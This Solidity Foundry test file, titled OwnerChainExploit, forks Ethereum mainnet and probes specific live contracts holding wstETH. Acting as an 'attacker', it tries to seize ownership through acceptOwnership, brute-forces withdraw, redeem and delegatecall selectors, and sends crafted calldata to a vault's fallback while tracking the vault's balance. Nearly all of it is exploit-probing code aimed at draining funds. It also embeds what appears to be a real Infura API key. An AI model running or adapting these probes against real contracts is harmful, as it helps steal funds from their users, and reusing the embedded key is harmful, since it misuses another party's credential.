// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract OwnerChainExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // Chain discovered
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT2_OWNER = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;
    address constant SLOT5_SLOT5 = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultSlot2OwnerSafe() public view {
        console.log("=== ANALYZING VAULT_SLOT2 OWNER SAFE ===\n");

        console.log("VAULT_SLOT2_OWNER:", VAULT_SLOT2_OWNER);
        console.log("Code size:", VAULT_SLOT2_OWNER.code.length);

        // Check Safe storage
        console.log("\nSafe storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(VAULT_SLOT2_OWNER, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Get owners
        (bool s, bytes memory d) = VAULT_SLOT2_OWNER.staticcall(
            abi.encodeWithSignature("getOwners()")
        );
        if (s && d.length > 0) {
            console.log("\nSafe owners result:");
            console.logBytes(d);
        }

        // Get threshold
        (bool s2, bytes memory d2) = VAULT_SLOT2_OWNER.staticcall(
            abi.encodeWithSignature("getThreshold()")
        );
        if (s2 && d2.length >= 32) {
            uint256 threshold = abi.decode(d2, (uint256));
            console.log("Threshold:", threshold);
        }
    }

    function test_CheckSlot5Slot5PendingOwner() public view {
        console.log("=== CHECKING SLOT5_SLOT5 PENDING OWNER ===\n");

        // Check pendingOwner
        (bool s1, bytes memory d1) = SLOT5_SLOT5.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s1 && d1.length >= 32) {
            address pending = abi.decode(d1, (address));
            console.log("Pending owner:", pending);

            if (pending != address(0)) {
                console.log("*** PENDING OWNER EXISTS! ***");
            }
        }

        // Check current owner
        (bool s2, bytes memory d2) = SLOT5_SLOT5.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s2 && d2.length >= 32) {
            address owner = abi.decode(d2, (address));
            console.log("Current owner:", owner);
        }
    }

    function test_TryAcceptOwnership() public {
        console.log("=== TRYING TO ACCEPT OWNERSHIP ===\n");

        // Get pending owner first
        (bool s1, bytes memory d1) = SLOT5_SLOT5.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        address pending = address(0);
        if (s1 && d1.length >= 32) {
            pending = abi.decode(d1, (address));
            console.log("Pending owner:", pending);
        }

        // Try as pending owner
        if (pending != address(0)) {
            vm.startPrank(pending);
            (bool s2,) = SLOT5_SLOT5.call(
                abi.encodeWithSignature("acceptOwnership()")
            );
            console.log("acceptOwnership as pending:", s2);
            vm.stopPrank();
        }

        // Try as attacker
        vm.startPrank(attacker);
        (bool s3, bytes memory d3) = SLOT5_SLOT5.call(
            abi.encodeWithSignature("acceptOwnership()")
        );
        console.log("acceptOwnership as attacker:", s3);
        if (!s3 && d3.length >= 4) {
            console.logBytes4(bytes4(d3));
        }
        vm.stopPrank();
    }

    function test_AnalyzeVaultSlot2Contract() public view {
        console.log("=== ANALYZING VAULT_SLOT2 CONTRACT ===\n");

        console.log("Address:", VAULT_SLOT2);
        console.log("Code size:", VAULT_SLOT2.code.length);

        bytes memory code = VAULT_SLOT2.code;

        // Find selectors
        console.log("\nFunction selectors:");
        bytes4[] memory uniqueSels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length && selCount < 50; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount; i++) {
            console.logBytes4(uniqueSels[i]);
        }

        // Count DELEGATECALL
        uint dcCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) dcCount++;
        }
        console.log("\nDELEGATECALL count:", dcCount);
    }

    function test_TryVaultSlot2Functions() public {
        console.log("=== TRYING VAULT_SLOT2 FUNCTIONS ===\n");

        // Try common functions as attacker
        vm.startPrank(attacker);

        bytes4[] memory sels = new bytes4[](15);
        sels[0] = bytes4(keccak256("withdraw(uint256)"));
        sels[1] = bytes4(keccak256("withdraw(uint256,address)"));
        sels[2] = bytes4(keccak256("deposit(uint256)"));
        sels[3] = bytes4(keccak256("redeem(uint256)"));
        sels[4] = bytes4(keccak256("redeem(uint256,address)"));
        sels[5] = bytes4(keccak256("claim()"));
        sels[6] = bytes4(keccak256("execute(address,bytes)"));
        sels[7] = bytes4(keccak256("call(address,bytes)"));
        sels[8] = bytes4(keccak256("multicall(bytes[])"));
        sels[9] = bytes4(keccak256("delegatecall(address,bytes)"));
        sels[10] = bytes4(keccak256("forward(address,bytes)"));
        sels[11] = bytes4(keccak256("proxy(address,bytes)"));
        sels[12] = bytes4(keccak256("performUpkeep(bytes)"));
        sels[13] = bytes4(keccak256("claimRewards()"));
        sels[14] = bytes4(keccak256("harvest()"));

        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = VAULT_SLOT2.call(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            if (s) {
                console.log("SUCCESS with selector:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        // Try as owner
        vm.startPrank(VAULT_SLOT2_OWNER);
        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = VAULT_SLOT2.call(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            if (s) {
                console.log("SUCCESS as OWNER with:");
                console.logBytes4(sels[i]);
            }
        }
        vm.stopPrank();
    }

    function test_CheckRCRegisteredRedemptions() public view {
        console.log("=== CHECKING RC REGISTERED REDEMPTIONS ===\n");

        // Check if any of our discovered contracts are registered
        address[] memory candidates = new address[](5);
        candidates[0] = VAULT_SLOT2;
        candidates[1] = VAULT_SLOT2_OWNER;
        candidates[2] = SLOT5_SLOT5;
        candidates[3] = VAULT;
        candidates[4] = address(uint160(uint256(vm.load(SLOT5_SLOT5, bytes32(0)))));

        for (uint i = 0; i < candidates.length; i++) {
            console.log("\nChecking:", candidates[i]);

            // Check RC storage for registration
            bytes32 key = keccak256(abi.encode(candidates[i], uint256(4)));
            bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
            console.logBytes32(val);

            if (val != bytes32(0)) {
                console.log("*** REGISTERED! ***");
            }
        }
    }

    function test_TraceOwnershipChain() public view {
        console.log("=== TRACING FULL OWNERSHIP CHAIN ===\n");

        // VAULT
        bytes32 vaultOwner = vm.load(VAULT, bytes32(0));
        console.log("VAULT owner:");
        console.logBytes32(vaultOwner);

        // VAULT_SLOT2
        bytes32 slot2Owner = vm.load(VAULT_SLOT2, bytes32(0));
        console.log("\nVAULT_SLOT2 owner:");
        console.logBytes32(slot2Owner);

        // SLOT5_SLOT5
        bytes32 slot5Owner = vm.load(SLOT5_SLOT5, bytes32(0));
        console.log("\nSLOT5_SLOT5 owner:");
        console.logBytes32(slot5Owner);

        // RC
        bytes32 rcOwner = vm.load(REDEMPTION_CONTROLLER, bytes32(0));
        console.log("\nRC owner:");
        console.logBytes32(rcOwner);

        // REDEMPTION_0
        bytes32 r0Owner = vm.load(REDEMPTION_0, bytes32(0));
        console.log("\nREDEMPTION_0 owner:");
        console.logBytes32(r0Owner);

        // Common owner?
        address timelock = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
        console.log("\nExpected Timelock:", timelock);
    }

    function test_CheckVaultDelegatecallSload() public view {
        console.log("=== ANALYZING VAULT SLOAD-BASED DELEGATECALL ===\n");

        bytes memory code = VAULT.code;

        // DELEGATECALL at 734 uses SLOAD at 687
        // Let's see what slot is loaded

        console.log("Bytecode around offset 640-740:");
        for (uint i = 640; i < 750 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) {
                console.log(i, "SLOAD");
            }
            if (op == 0xf4) {
                console.log(i, "DELEGATECALL");
            }
            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH val:", val);
            }
        }

        // Check what's in slot 2 and 5 of VAULT
        console.log("\nVAULT storage:");
        console.log("Slot 2:");
        console.logBytes32(vm.load(VAULT, bytes32(uint256(2))));
        console.log("Slot 5:");
        console.logBytes32(vm.load(VAULT, bytes32(uint256(5))));
    }

    function test_TryVaultFallback() public {
        console.log("=== TRYING VAULT FALLBACK WITH CRAFTED CALLDATA ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try random calldata that might trigger fallback -> delegatecall
        bytes[] memory payloads = new bytes[](5);
        payloads[0] = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);
        payloads[1] = abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, attacker);
        payloads[2] = hex"7bde82f20000000000000000000000000000000000000000000056bc75e2d631000000"; // RC.redeem selector
        payloads[3] = hex"deadbeef";
        payloads[4] = "";

        for (uint i = 0; i < payloads.length; i++) {
            (bool s,) = VAULT.call(payloads[i]);
            console.log("Payload", i, "success:", s);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }
}
